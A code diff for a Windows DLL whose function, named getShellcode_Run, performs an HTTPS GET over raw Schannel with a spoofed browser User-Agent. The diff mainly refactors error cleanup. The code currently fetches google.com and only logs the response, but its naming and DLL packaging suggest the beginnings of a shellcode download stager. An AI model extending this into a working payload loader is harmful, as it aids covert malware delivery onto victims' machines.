@@ -11,31 +11,41 @@
 
 #define DEFAULT_BUFLEN 4096
 
-// Update these to match your setup
 char ip[] = "www.google.com";
 char port[] = "443";
-char resource[] = "";  // Empty resource for Google homepage
+char resource[] = "";
+
+void cleanup(SOCKET* ConnectSocket, CredHandle* hCred, CtxtHandle* hContext, char* encryptedBuf) {
+    if (encryptedBuf) {
+        free(encryptedBuf);
+    }
+    DeleteSecurityContext(hContext);
+    FreeCredentialsHandle(hCred);
+    if (*ConnectSocket != INVALID_SOCKET) {
+        closesocket(*ConnectSocket);
+        *ConnectSocket = INVALID_SOCKET;
+    }
+    WSACleanup();
+}
 
 void getShellcode_Run(char* host, char* port, char* resource) {
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
-    struct addrinfo *result = NULL, *ptr = NULL, hints;
+    struct addrinfo* result = NULL;
+    struct addrinfo* ptr = NULL;
+    struct addrinfo hints;
     char sendbuf[MAX_PATH] = "";
-    char recvbuf[DEFAULT_BUFLEN];
     char sslBuf[32768];
-    char *encryptedBuf = NULL;
+    char* encryptedBuf = NULL;
     int iResult;
     int sslBufLen = 0;
-    CredHandle hCred;
-    CtxtHandle hContext;
-    SECURITY_STATUS secStatus;
-    SecBuffer bufs[4] = {0};
-    SecBufferDesc message = {0};
-    char fullResponse[65536] = {0};
+    CredHandle hCred = { 0 };
+    CtxtHandle hContext = { 0 };
+    char fullResponse[65536] = { 0 };
     int fullResponseLen = 0;
     int totalSize = 0;
 
-    // Log Windows version for debugging
+    // Log Windows version
     OSVERSIONINFO osvi;
     ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
     osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
@@ -44,15 +54,15 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     sprintf_s(osMsg, 256, "Windows Version: %d.%d (Build %d)\n", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
     OutputDebugStringA(osMsg);
 
-    // Build proper HTTP request with cache-control headers
-    sprintf_s(sendbuf, MAX_PATH, 
+    // Build HTTP request
+    sprintf_s(sendbuf, MAX_PATH,
         "GET /%s HTTP/1.1\r\n"
         "Host: %s\r\n"
         "Connection: close\r\n"
         "Cache-Control: no-cache\r\n"
         "Pragma: no-cache\r\n"
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
-        "\r\n", 
+        "\r\n",
         resource, host);
     OutputDebugStringA("HTTP Request: ");
     OutputDebugStringA(sendbuf);
@@ -73,7 +83,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    // Resolve the server address and port
+    // Resolve hostname
     OutputDebugStringA("Resolving hostname...\n");
     iResult = getaddrinfo(host, port, &hints, &result);
     if (iResult != 0) {
@@ -85,17 +95,16 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     }
     OutputDebugStringA("Hostname resolved successfully\n");
 
-    // Log resolved IP addresses
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
         char ipStr[INET_ADDRSTRLEN];
-        struct sockaddr_in *sa = (struct sockaddr_in *)ptr->ai_addr;
+        struct sockaddr_in* sa = (struct sockaddr_in*)ptr->ai_addr;
         inet_ntop(AF_INET, &(sa->sin_addr), ipStr, INET_ADDRSTRLEN);
         char logMsg[256];
         sprintf_s(logMsg, 256, "Resolved IP: %s\n", ipStr);
         OutputDebugStringA(logMsg);
     }
 
-    // Create socket and connect
+    // Connect to server
     OutputDebugStringA("Creating socket and connecting...\n");
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
         ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
@@ -127,14 +136,14 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     }
     OutputDebugStringA("Connected to server successfully\n");
 
-    // Initialize SSL with a specific cipher suite
-    SCHANNEL_CRED schannelCred = {0};
+    // Initialize SSL
+    SCHANNEL_CRED schannelCred = { 0 };
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
     schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
     schannelCred.dwFlags = 0;
 
     OutputDebugStringA("Acquiring credentials handle...\n");
-    secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &schannelCred, NULL, NULL, &hCred, NULL);
+    SECURITY_STATUS secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &schannelCred, NULL, NULL, &hCred, NULL);
     if (secStatus != SEC_E_OK) {
         char errorMsg[256];
         sprintf_s(errorMsg, 256, "AcquireCredentialsHandle failed: 0x%08X\n", secStatus);
@@ -149,7 +158,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     SecBufferDesc outBuffer, inBuffer;
     SecBuffer outBuffers[1], inBuffers[2];
     DWORD dwFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |
-                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM | ISC_REQ_MANUAL_CRED_VALIDATION;
+                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;
 
     outBuffers[0].pvBuffer = NULL;
     outBuffers[0].BufferType = SECBUFFER_TOKEN;
@@ -164,7 +173,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         char errorMsg[256];
         sprintf_s(errorMsg, 256, "InitializeSecurityContext (first call) failed: 0x%08X\n", secStatus);
         OutputDebugStringA(errorMsg);
-        goto Cleanup;
+        cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+        return;
     }
     OutputDebugStringA("Security context initialized (first call)\n");
 
@@ -174,12 +184,14 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         char errorMsg[256];
         sprintf_s(errorMsg, 256, "SSL handshake send failed: %d\n", WSAGetLastError());
         OutputDebugStringA(errorMsg);
-        goto Cleanup;
+        FreeContextBuffer(outBuffers[0].pvBuffer);
+        cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+        return;
     }
     OutputDebugStringA("Sent initial handshake message\n");
     FreeContextBuffer(outBuffers[0].pvBuffer);
 
-    // Receive handshake response
+    // Handshake loop
     do {
         OutputDebugStringA("Receiving handshake response...\n");
         iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
@@ -187,7 +199,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
             char errorMsg[256];
             sprintf_s(errorMsg, 256, "SSL handshake recv failed: %d\n", WSAGetLastError());
             OutputDebugStringA(errorMsg);
-            goto Cleanup;
+            cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+            return;
         }
         sslBufLen += iResult;
         char logMsg[256];
@@ -212,7 +225,9 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         secStatus = InitializeSecurityContextA(&hCred, &hContext, NULL, dwFlags, 0, 0, &inBuffer, 0, NULL, &outBuffer, &dwFlags, NULL);
         if (secStatus == SEC_E_OK) {
             OutputDebugStringA("SSL handshake completed successfully\n");
-        } else if (secStatus == SEC_I_CONTINUE_NEEDED) {
+            break;
+        }
+        else if (secStatus == SEC_I_CONTINUE_NEEDED) {
             OutputDebugStringA("SSL handshake continuing...\n");
             if (outBuffers[0].pvBuffer) {
                 iResult = send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
@@ -221,43 +236,42 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                     char errorMsg[256];
                     sprintf_s(errorMsg, 256, "SSL handshake continuation send failed: %d\n", WSAGetLastError());
                     OutputDebugStringA(errorMsg);
-                    goto Cleanup;
+                    cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+                    return;
                 }
             }
             sslBufLen = 0;  // Reset buffer for next iteration
-        } else {
+        }
+        else {
             char errorMsg[256];
             sprintf_s(errorMsg, 256, "InitializeSecurityContext (subsequent call) failed: 0x%08X\n", secStatus);
             OutputDebugStringA(errorMsg);
-            goto Cleanup;
+            cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+            return;
         }
-    } while (secStatus == SEC_I_CONTINUE_NEEDED);
+    } while (true);
 
-    if (secStatus != SEC_E_OK) {
-        char errorMsg[256];
-        sprintf_s(errorMsg, 256, "SSL handshake failed: 0x%08X\n", secStatus);
-        OutputDebugStringA(errorMsg);
-        goto Cleanup;
-    }
-
-    // Log the negotiated cipher suite with more detail
+    // Log the negotiated cipher suite
     SecPkgContext_ConnectionInfo connInfo;
     secStatus = QueryContextAttributesA(&hContext, SECPKG_ATTR_CONNECTION_INFO, &connInfo);
     if (secStatus == SEC_E_OK) {
         char logMsg[256];
         sprintf_s(logMsg, 256, "Negotiated Protocol: 0x%04X, Cipher: 0x%04X, Hash: 0x%04X\n",
-                  connInfo.dwProtocol, connInfo.aiCipher, connInfo.aiHash);
+            connInfo.dwProtocol, connInfo.aiCipher, connInfo.aiHash);
         OutputDebugStringA(logMsg);
 
-        // Map the cipher suite to a human-readable name (simplified)
+        // Map cipher suite to a human-readable name
         if (connInfo.dwProtocol == 0x0303) {  // TLS 1.2
             if (connInfo.aiCipher == 0x2F && connInfo.aiHash == 0x1) {
                 OutputDebugStringA("Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA\n");
-            } else if (connInfo.aiCipher == 0x9C && connInfo.aiHash == 0xA2) {
+            }
+            else if (connInfo.aiCipher == 0x9C && connInfo.aiHash == 0xA2) {
                 OutputDebugStringA("Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n");
-            } else if (connInfo.aiCipher == 0x9E && connInfo.aiHash == 0xA3) {
+            }
+            else if (connInfo.aiCipher == 0x9E && connInfo.aiHash == 0xA3) {
                 OutputDebugStringA("Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n");
-            } else {
+            }
+            else {
                 OutputDebugStringA("Cipher Suite: Unknown\n");
             }
         }
@@ -271,7 +285,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         char errorMsg[256];
         sprintf_s(errorMsg, 256, "QueryContextAttributes failed: 0x%08X\n", secStatus);
         OutputDebugStringA(errorMsg);
-        goto Cleanup;
+        cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+        return;
     }
 
     char sizeMsg[256];
@@ -282,10 +297,12 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     encryptedBuf = (char*)malloc(sizes.cbHeader + sizes.cbMaximumMessage + sizes.cbTrailer);
     if (!encryptedBuf) {
         OutputDebugStringA("malloc failed\n");
-        goto Cleanup;
+        cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+        return;
     }
 
-    // Set up the buffers for encryption
+    // Set up encryption buffers
+    SecBuffer bufs[4] = { 0 };
     bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
     bufs[0].cbBuffer = sizes.cbHeader;
     bufs[0].pvBuffer = encryptedBuf;
@@ -303,6 +320,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     bufs[3].cbBuffer = 0;
     bufs[3].pvBuffer = NULL;
 
+    SecBufferDesc message;
     message.ulVersion = SECBUFFER_VERSION;
     message.cBuffers = 4;
     message.pBuffers = bufs;
@@ -316,11 +334,12 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         char errorMsg[256];
         sprintf_s(errorMsg, 256, "EncryptMessage failed: 0x%08X\n", secStatus);
         OutputDebugStringA(errorMsg);
-        goto Cleanup;
+        cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+        return;
     }
     OutputDebugStringA("EncryptMessage succeeded\n");
 
-    // Send the encrypted data (header + data + trailer)
+    // Send the encrypted data
     totalSize = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
     OutputDebugStringA("Sending encrypted HTTP request...\n");
     iResult = send(ConnectSocket, encryptedBuf, totalSize, 0);
@@ -328,14 +347,16 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         char errorMsg[256];
         sprintf_s(errorMsg, 256, "send failed: %d\n", WSAGetLastError());
         OutputDebugStringA(errorMsg);
-        goto Cleanup;
+        cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+        return;
     }
     OutputDebugStringA("Sent encrypted HTTP request\n");
 
     // Receive and decrypt the response
     sslBufLen = 0;
     int processedBytes = 0;
-    do {
+    bool continueReceiving = true;
+    while (continueReceiving) {
         OutputDebugStringA("Receiving response...\n");
         iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
         if (iResult > 0) {
@@ -344,7 +365,6 @@ void getShellcode_Run(char* host, char* port, char* resource) {
             sprintf_s(logMsg, 256, "Received %d bytes of encrypted data (total: %d)\n", iResult, sslBufLen);
             OutputDebugStringA(logMsg);
 
-            // Log the first few bytes of the received data (in hex) for debugging
             if (sslBufLen >= 5) {
                 sprintf_s(logMsg, 256, "First 5 bytes (hex): %02X %02X %02X %02X %02X\n",
                     (unsigned char)sslBuf[0], (unsigned char)sslBuf[1],
@@ -353,31 +373,26 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                 OutputDebugStringA(logMsg);
             }
 
-            // Process the buffer in a loop to handle multiple TLS records
             processedBytes = 0;
             while (processedBytes < sslBufLen) {
-                // Check if we have at least the TLS record header (5 bytes)
                 if (sslBufLen - processedBytes < 5) {
                     OutputDebugStringA("Incomplete TLS record header, need more data\n");
                     break;
                 }
 
-                // Parse the TLS record length
                 unsigned int recordLen = (unsigned char)sslBuf[processedBytes + 3] << 8 |
-                                         (unsigned char)sslBuf[processedBytes + 4];
+                    (unsigned char)sslBuf[processedBytes + 4];
                 unsigned int totalRecordLen = recordLen + 5;
 
-                // Check if we have the full record
                 if (sslBufLen - processedBytes < totalRecordLen) {
                     sprintf_s(logMsg, 256, "Incomplete TLS record (need %u bytes, have %d), need more data\n",
-                              totalRecordLen, sslBufLen - processedBytes);
+                        totalRecordLen, sslBufLen - processedBytes);
                     OutputDebugStringA(logMsg);
                     break;
                 }
 
-                // Set up buffers for decryption (use 4 buffers as recommended by SChannel)
-                SecBuffer inBufs[4] = {0};
-                SecBufferDesc inBuffer = {0};
+                SecBuffer inBufs[4] = { 0 };
+                SecBufferDesc inBuffer;
                 inBufs[0].pvBuffer = sslBuf + processedBytes;
                 inBufs[0].cbBuffer = totalRecordLen;
                 inBufs[0].BufferType = SECBUFFER_DATA;
@@ -391,7 +406,6 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                 OutputDebugStringA("Decrypting message...\n");
                 secStatus = DecryptMessage(&hContext, &inBuffer, 0, NULL);
                 if (secStatus == SEC_E_OK) {
-                    // Find the decrypted data buffer
                     int decryptedLen = 0;
                     for (int i = 0; i < 4; i++) {
                         if (inBufs[i].BufferType == SECBUFFER_DATA) {
@@ -406,48 +420,48 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                     sprintf_s(logMsg, 256, "Decrypted %d bytes\n", decryptedLen);
                     OutputDebugStringA(logMsg);
                     processedBytes += totalRecordLen;
-                } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
+                }
+                else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
                     OutputDebugStringA("Incomplete message (unexpected), need more data\n");
                     break;
-                } else {
+                }
+                else {
                     char errorMsg[256];
                     sprintf_s(errorMsg, 256, "DecryptMessage failed: 0x%08X\n", secStatus);
                     OutputDebugStringA(errorMsg);
-                    goto Cleanup;
+                    cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
+                    return;
                 }
             }
 
-            // Shift remaining data to the beginning of sslBuf
             if (processedBytes > 0 && processedBytes < sslBufLen) {
                 memmove(sslBuf, sslBuf + processedBytes, sslBufLen - processedBytes);
             }
             sslBufLen -= processedBytes;
-        } else if (iResult == 0) {
+        }
+        else if (iResult == 0) {
             OutputDebugStringA("Connection closed\n");
-            break;
-        } else {
+            continueReceiving = false;
+        }
+        else {
             char errorMsg[256];
             sprintf_s(errorMsg, 256, "recv failed: %d\n", WSAGetLastError());
             OutputDebugStringA(errorMsg);
-            break;
+            continueReceiving = false;
         }
-    } while (true);
+    }
 
     // Parse the HTTP response
     if (fullResponseLen > 0) {
         fullResponse[fullResponseLen] = '\0';
         OutputDebugStringA("Full Response: ");
         OutputDebugStringA(fullResponse);
-    } else {
+    }
+    else {
         OutputDebugStringA("No data received\n");
     }
 
-Cleanup:
-    if (encryptedBuf) free(encryptedBuf);
-    DeleteSecurityContext(&hContext);
-    FreeCredentialsHandle(&hCred);
-    closesocket(ConnectSocket);
-    WSACleanup();
+    cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
